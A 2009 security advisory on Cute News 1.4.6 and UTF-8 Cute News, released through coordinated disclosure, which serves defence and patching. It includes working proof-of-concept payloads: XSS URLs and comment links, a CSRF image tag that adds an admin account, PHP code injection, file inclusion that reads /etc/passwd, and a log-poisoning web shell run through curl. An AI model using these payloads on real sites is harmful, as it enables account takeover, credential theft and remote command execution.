@@ -1,0 +1,478 @@
+MorningStar Security - Advisory
+http://www.morningstarsecurity.com/
+
+Multiple security issues in Cute News and UTF-8 Cute News
+
+
+1. Advisory Information
+------------------------------------------------------------------------------------------------------------------------
+Title: Multiple security issues in Cute News and UTF-8 Cute News
+Advisory ID: MORNINGSTAR-2009-02
+Advisory URL: http://www.morningstarsecurity.com/advisories/
+Release Type: Co-ordinated, responsible disclosure
+
+
+2. Vulnerability Information
+------------------------------------------------------------------------------------------------------------------------
+Class: Cross Site Request Forgery, Cross Site Scripting, File Path Disclosure, Local File Inclusion, Authentication Bypass and PHP Command Injection
+Remotely Exploitable: Yes
+Locally Exploitable: No
+
+
+3. Vulnerability Description
+------------------------------------------------------------------------------------------------------------------------
+Cute News is a powerful and easy to use news management system that uses flat files to store its database. It supports commenting, archives, search function, file upload management, backup & restore, IP banning, flood protection and more. It's available for free from http://www.cutephp.com/. Cute News is at the time of writing, the second most popular script on www.hotscripts.com. UTF-8 CuteNews is a current fork of the Cute News project which is designed to improve security and is available for free from http://korn19.ch/coding/utf8-cutenews/
+
+Multiple vulnerabilities exist in Cute News and UTF-8 CuteNews. These vulnerabilities can be exploited to steal user credentials, disclose file contents, disclose the file path of the application and execute arbitrary commands.
+
+Cute News appears to be abandoned since September 2008. A local file inclusion (LFI) vulnerability was discovered by athos on January 9th, 2009 for which no patch has been made.
+
+
+4. Vulnerable Packages
+------------------------------------------------------------------------------------------------------------------------
+Cute News 1.4.6 and Cute News UTF-8 are vulnerable. Earlier versions might be effected.
+
+
+5. Non-vulnerable Packages
+------------------------------------------------------------------------------------------------------------------------
+Cute News UTF-8b.
+
+
+6. Vendor Information, Solutions and Workarounds
+------------------------------------------------------------------------------------------------------------------------
+Upgrade to Cute News UTF-8 version 8b.
+Lucas Jacques, the maintaner of Cute News UTF-8 was very helpful.
+
+
+7. Credits
+------------------------------------------------------------------------------------------------------------------------
+These vulnerabilities were discovered and researched by Andrew Horton (urbanadventurer) from MorningStar Security.
+
+
+8. Technical Description / Proof of Concept
+------------------------------------------------------------------------------------------------------------------------
+
+8.1 Introduction
+
+Many past advisories have been published for Cute News. An unpatched LFI exploit was published in January 2009.
+
+Attackers without a registered account or with a comment level account can exploit cross site scripting (XSS) to steal cookies from other users, cross site request forgery (CSRF) vulnerability to execute administrator functions including adding a new administrator account and can exploit a file path disclosure vulnerability.
+
+Attackers with an administrator account, possibly gained by using the exploits described above can exploit local file inclusion and command execution vulnerabilities to execute arbitrary commands. Journalist and Editor level accounts can edit any article. Administrator and editor level accounts can also exploit a partial file disclosure vulnerability to view all usernames.
+
+Cute News suffers from other security failures such as:
+
+* User registration, in register.php the password input field should be shown as stars to prevent shoulder surfing. This is fixed in UTF-8b.
+
+* Email addresses are exposed by the news article template. The email address should be obsfucated to prevent spam harvesting. There is an option in both 1.4.6 and UTF-8b versions to hide the email address.
+
+* Insecure cookie handling and session handling. Users are authenticated with each request by the username and password hash in the cookie. So the password is not known to authenticate.
+Eg. Cookie: username=user2; md5_password=7e58d63b60197ceb55a1c487989a3720
+In the UTF-8 fork the password cookie is salted with a prefix of 'FqZm$()G_~<' and a suffix of the users remote IP address. It is worth noting that an XSS attack will capture this cookie, and that the password can be cracked with John the Ripper using a custom rule because both the prefix and suffix will be known to the attacker.
+
+
+A XSS bug was reported by DeltahackingTEAM on 2008-11-07 which I am unable to reproduce. The details are:
+Exploit: http://www.example.com/register.php?config_skin=../../../../etc/passwd%00
+Link: http://www.securityfocus.com/bid/32142/info
+
+UTF-8 Cute News has not been reviewed except to check whether if it is effected by vulnerabilities found in Cute News 1.4.6.
+
+
+8.2 Reflected Cross Site Scripting in index.php
+------------------------------------------------------------------------------------------------------------------------
+Severity: 	Medium
+Requires: 	Register globals to be on
+			The victim user must be logged out
+			Magic quotes must be off
+
+8.2.1 Proof of concept exploit
+
+http://test/cutenews/index.php?lastusername='%3E%3Cscript%3Ealert(/xss/);%3C/script%3E
+
+8.2.2 Vulnerable packages
+
+1.4.6
+
+8.2.3 Non-Vulnerable packages
+
+UTF-8, UTF-8b
+
+
+8.3 Reflected Cross Site Scripting in index.php
+------------------------------------------------------------------------------------------------------------------------
+Severity: 	Medium
+Requires: 	Register globals to be on
+			The victim user must be logged in
+			Magic quotes must be off
+			Commenter level or higher user to be logged in
+
+8.3.1 Proof of concept exploit
+
+http://localhost/test/cutenews/index.php?mod=%3Cscript%3Ealert(/xss/)%3C/script%3E
+
+8.3.2 Vulnerable packages
+
+1.4.6
+
+8.3.3 Non-Vulnerable packages
+
+UTF-8, UTF-8b
+
+
+8.4 Reflected Cross Site Scripting in register.php
+------------------------------------------------------------------------------------------------------------------------
+Severity: 	Medium
+Requires: 	Register globals to be on
+			Magic quotes must be off
+			User registrations must be allowed
+			
+8.4.1 Proof of concept exploit
+
+http://test/cutenews/register.php?result=%3Cscript%3Ealert(/XSS/);%3C/script%3E
+
+8.4.2 Vulnerable packages
+
+1.4.6, UTF-8
+
+8.4.3 Non-Vulnerable packages
+
+UTF-8b
+
+
+8.5 Reflected Cross Site Scripting in search.php with user
+------------------------------------------------------------------------------------------------------------------------
+Severity: 	Medium
+Requires: 	Register globals to be on
+			The victim user must be logged in
+			Magic quotes must be off
+
+8.5.1 Proof of concept exploit
+
+http://test/cutenews/search.php?user=%22%3E%3Cscript%3Ealert(/xss/);%3C/script%3E
+
+8.5.2 Vulnerable packages
+
+1.4.6, UTF-8
+
+8.5.3 Non-Vulnerable packages
+
+UTF-8b
+
+
+8.6 Reflected Cross Site Scripting in search.php with title
+------------------------------------------------------------------------------------------------------------------------
+Severity: 	Medium
+Requires: 	Register globals to be on
+			The victim user must be logged in
+			Magic quotes must be off
+
+
+8.6.1 Proof of concept exploit
+
+http://test/cutenews/search.php?title=%22%3E%3Cscript%3Ealert(/xss/);%3C/script%3E
+
+8.6.2 Vulnerable packages
+
+1.4.6
+
+8.6.3 Non-Vulnerable packages
+
+UTF-8, UTF-8b
+
+
+8.7 Reflected Cross Site Scripting in editnews module
+------------------------------------------------------------------------------------------------------------------------
+Severity: 	Medium
+Requires: 	Register globals to be on
+			The victim user must be logged in
+			Magic quotes must be off
+			Administrator level user
+
+8.7.1 Proof of concept exploit
+
+http://localhost/test/cutenews/index.php?mod=editnews&action=list&cat_msg=%3Cscript%3Ealert(/xss/);%3C/script%3E
+http://localhost/test/cutenews/index.php?mod=editnews&action=list&source_msg=%3Cscript%3Ealert(/xss/);%3C/script%3E
+http://localhost/test/cutenews/index.php?mod=editnews&action=list&postponed_selected=%3E%3Cscript%3Ealert(/xss/);%3C/script%3E
+http://localhost/test/cutenews/index.php?mod=editnews&action=list&unapproved_selected=%3E%3Cscript%3Ealert(/xss/);%3C/script%3E
+http://localhost/test/cutenews/index.php?mod=editnews&action=list&news_per_page=%3Cscript%3Ealert(/xss/);%3C/script%3E
+
+8.7.2 Vulnerable packages
+
+1.4.6, UTF-8
+
+8.7.3 Non-Vulnerable packages
+
+UTF-8b
+
+
+8.8 Stored Cross Site Scripting in news comments
+------------------------------------------------------------------------------------------------------------------------
+Severity: 	Medium
+Requires: 	Magic quotes must be off			
+
+8.8.1 Proof of concept exploit
+
+Leave a comment with the following code:
+Exploit for version 1.4.6
+[link=javascript://%0adocument.write('<script>alert(/xss/)</script>')]funny pictures[/link]
+
+Exploit for version UTF-8
+[link=javascript://%0adocument.write('<img src="javascript:alert(/xss/);">')]funny pictures[/link]
+
+This will show as funny pictures and when a user clicks on it, the javascript will execute. Not that the link text cannot include dots.
+
+
+8.8.2 Vulnerable packages
+
+1.4.6, UTF-8
+
+8.8.3 Non-Vulnerable packages
+
+UTF-8b. The [link=] tag has been removed from UTF-8b.
+
+
+
+
+8.9 Stored Cross Site Scripting in news articles
+------------------------------------------------------------------------------------------------------------------------
+Severity: 	Medium
+Requires: 	The victim user must be logged in
+			Magic quotes must be off
+			Journalist, editor or admin access. Not commenter.
+			Admin to approve the article
+			
+8.9.1 Proof of concept exploit
+
+http://localhost/test/cutenews/index.php?mod=addnews&action=addnews
+
+A user can include script tags in the body of a news article then all users who view this article can have their cookies stolen.
+A journalist user needs the admin to approve the article without noticing the included script tags, while an editor user doesn't need approval.
+
+8.9.2 Vulnerable packages
+
+1.4.6, UTF-8, UTF-8b.
+
+8.9.3 Non-Vulnerable packages
+
+None
+
+8.9.4 Vendor Comment
+
+The administrator must ensure that the users who can post news are trustworthy.
+
+
+8.10 Edit Any Article and Moderation Bypass
+------------------------------------------------------------------------------------------------------------------------
+Severity: 	Medium
+Requires: 	Magic quotes must be off
+			Journalist, editor or admin access. Not commenter.
+
+The allows a journalist or editor level user to edit any article.
+
+By default a journalist user cannot edit his own news articles. Using this method, a journalist can submit an article, have it approved by the admin, then later change it to include stored XSS.
+			
+8.10.1 Proof of concept exploit
+
+Article IDs can be found in the links from this page: http://localhost/test/cutenews/index.php?mod=editnews&action=list
+
+Change id parameter to the id of the article you wish to change. 
+
+http://localhost/test/cutenews/index.php?action=doeditnews&mod=editnews&title=<script>alert(/xss/);</script>&short_story=A new article&full_story=&id=1255233147&source=&if_convert_new_lines=yes&if_use_html=yes
+
+8.10.2 Vulnerable packages
+
+1.4.6, UTF-8
+
+8.10.3 Non-Vulnerable packages
+
+UTF-8b
+
+8.10.4 Vendor Comment
+
+The administrator must ensure that the users who can post news are trustworthy.
+
+
+8.11 File Path Disclosure in search.php
+------------------------------------------------------------------------------------------------------------------------
+Severity: 	Low
+
+8.11.1 Proof of concept exploit
+
+File Path Disclosure
+Warning: mktime() expects parameter 5 to be long, string given in /var/www/test/cutenews/search.php on line 176
+
+http://test/cutenews/search.php?dosearch=yes&from_date_day=a&from_date_month=5&from_date_year=2003&to_date_day=4&to_date_month=5&to_date_year=2010
+
+8.11.2 Vulnerable packages
+
+1.4.6, UTF-8
+
+8.11.3 Non-Vulnerable packages
+
+UTF-8b
+
+
+8.12 Cross Site Request Forgery
+------------------------------------------------------------------------------------------------------------------------
+Severity: 	High
+Requires: 	Admin user to be logged in
+
+There is no protection against CSRF attacks. A user can trick the admin into making another admin just by viewing html.
+
+Works with a GET request:
+http://localhost/test/cutenews/index.php?regusername=a&regpassword=a&regnickname=a&regemail=a%40a.com&reglevel=1&action=adduser&mod=editusers
+
+8.12.1 Proof of concept exploit
+
+1) Include the following image code in a webpage:
+<img src="http://localhost/test/cutenews/index.php?regusername=a&regpassword=a&regnickname=a&regemail=a%40a.com&reglevel=1&action=adduser&mod=editusers">
+2) Leave a comment on a news item asking the admin to view that webpage
+3) if they look at the page while they're logged in then the a new admin user 'a', with a password of 'a' will be created.
+
+8.12.2 Vulnerable packages
+
+1.4.6, UTF-8
+
+8.12.3 Non-Vulnerable packages
+
+UTF-8b
+
+
+8.13 PHP Code Injection for categories module
+------------------------------------------------------------------------------------------------------------------------
+Severity: 	Medium
+Requires: 	Administrator level account
+
+8.13.1 Proof of concept exploit
+
+1) Browse to http://localhost/test/cutenews/index.php?mod=categories
+2) Add a category with <? phpinfo(); ?> as the Icon URL or Category Access field.
+3) category.db.php will have a line such as:	3|foo|<?phpinfo();?>|0|||
+4) Browse to category.db.php and your injected PHP code will have executed
+
+http://localhost/test/cutenews-utf8/data/category.db.php
+
+8.13.2 Vulnerable packages
+
+1.4.6
+UTF-8 has protection for the category and icon url fields. The category access field in injectable.
+
+8.13.3 Non-Vulnerable packages
+
+UTF-8b Contains an error on this page with the token functionality.
+
+
+8.14 Local File Inclusion in options module
+------------------------------------------------------------------------------------------------------------------------
+Severity: 	Medium
+Requires: 	Administrator level account
+		  	Magic quotes must be off for %00 file name truncation technique
+
+This can be used to view any file or execute abitrary PHP code.
+
+8.14.1 Proof of concept exploit
+
+To view the /etc/passwd file
+1) Browse to http://localhost/test/cutenews/index.php?mod=options&action=syscon
+2) Change the skin variable on the System Configuration
+3) Intercept the POST and change the form variables, i.e. save_con%5Bskin%5D=../../../../../../../../../../../../../../../../etc/passwd%00
+4) Load any page and the /etc/passwd will be included
+
+To execute abitrary code
+1) Browse to http://localhost/test/cutenews/index.php?mod=options&action=syscon
+2) Change the skin variable on the System Configuration
+3) Intercept the POST and change the form variables, i.e. save_con%5Bskin%5D=../../../../../../../../../../../../../../../../proc/self/fd/1
+4) Try including /proc/self/fd/1 to /proc/self/fd/100 until you find the web server logs
+5) Inject a cmd shell into the logs by requesting a page and including "<? phpcmd ?>" as a User Agent
+6) Load any page and your injected PHP command will execute
+
+Eg.
+$ curl -u "<? passthru($_REQUEST['cmd']); ?>" http://localhost/test/cutenews/
+Load any page, and your code will execute
+$ curl http://localhost/test/cutenews/index.php?cmd=id
+
+8.14.2 Vulnerable packages
+1.4.6
+
+8.14.3 Non-Vulnerable packages
+UTF-8, UTF-8b
+
+
+8.15 Partial File Disclosure in editnews module
+------------------------------------------------------------------------------------------------------------------------
+Severity: 	Low
+Requires:	Editor or Administrator level account 
+		  	Magic quotes must be off for %00 file name truncation technique
+
+This can be used to view the first column of any pipe delimited file. An editor level or higher user can get a list of usernames from the users.db.php file.
+
+8.15.1 Proof of concept exploit
+
+http://localhost/test/cutenews/index.php?mod=editnews&action=list&source=../users.db.php%00
+
+8.15.2 Vulnerable packages
+1.4.6
+
+8.15.3 Non-Vulnerable packages
+UTF-8, UTF-8b
+
+
+8.16 Partial File Disclosure in editnews module
+------------------------------------------------------------------------------------------------------------------------
+Severity: 	Medium
+Requires:	Editor or Administrator level account
+		  	Magic quotes must be off for %00 file name truncation technique
+
+An administrator level user can get full user details including password hashes.
+		  
+8.16.1 Proof of concept exploit
+
+http://localhost/test/cutenews/index.php?mod=editnews&action=editnews&id=1255182669&source=../users.db.php%00
+
+8.16.2 Vulnerable packages
+1.4.6
+
+8.16.3 Non-Vulnerable packages
+UTF-8, UTF-8b
+
+
+8.17 PHP Command Injection in ipban module
+------------------------------------------------------------------------------------------------------------------------
+Severity: 	Medium
+Requires:	Administrator level account 
+
+Reported by athos, staker[at]hotmail[dot]it and is unpatched.
+
+8.17.1 Proof of concept exploit
+
+http://localhost/test/cutenews/index.php?add_ip=<?phpinfo();?>&action=add&mod=ipban
+load http://localhost/test/cutenews/data/ipban.php to see the result
+
+8.17.2 Vulnerable packages
+1.4.6
+
+8.17.3 Non-Vulnerable packages
+UTF-8, UTF-8b
+
+
+9. Report Timeline
+------------------------------------------------------------------------------------------------------------------------
+11th October 2009 - Andrew Horton at MorningStar Security notifies Georgi at flexer at cutephp dot com
+11th October 2009 - Andrew Horton at MorningStar Security notifies the UTF-8 Cute News fork
+17th October 2009 - Posted a public request for co-ordination on the forum at cutephp.com
+18th October 2009 - Lucas Jacques, maintainer of UTF-8 Cute News confirms bugs and begins patching
+9th November 2009 - Lucas Jacques releases patched version UTF-8b Cute News on http://korn19.ch/coding/utf8-cutenews/
+10th November 2009 - Andrew Horton at MorningStar Security checks that the patched version is no longer vulnerable
+11th November 2009 - Morningstar Security publishes this adviosry
+
+
+10. About Morning Star Security
+----------------------------------------------------------------------------------------------
+MorningStar Security is an IT security consulting firm in Christchurch, New Zealand.
+
+The freshest blend of IT security news is available for your daily consumption at http://www.morningstarsecurity.com/news/
+
+
+11. Disclaimer & Copyright
+----------------------------------------------------------------------------------------------
+The contents of this advisory are copyright (c) 2009 MorningStar Security, and may be distributed freely provided that and proper credit is given.
